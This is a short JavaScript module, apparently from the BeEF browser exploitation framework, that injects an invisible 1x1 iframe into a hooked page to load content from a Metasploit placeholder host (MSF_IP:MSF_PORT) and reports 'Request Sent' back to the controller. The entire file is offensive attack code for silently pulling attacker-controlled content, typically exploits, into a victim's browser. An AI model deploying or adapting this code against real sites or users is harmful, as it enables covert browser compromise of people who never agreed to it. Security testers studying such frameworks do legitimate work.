// iframe.setAttribute("style", "visibility:hidden;"); doesn't work with ie

function do_main(){
	var iframe = document.createElement('iframe');
	iframe.src = 'http://MSF_IP:MSF_PORT/beef.html';
	iframe.setAttribute("width", "1");
	iframe.setAttribute("height", "1");
	iframe.setAttribute("style", "visibility:hidden;");
	document.body.appendChild(iframe);

	return "Request Sent";
}

var result_value = do_main();


return_result(result_id, result_value);
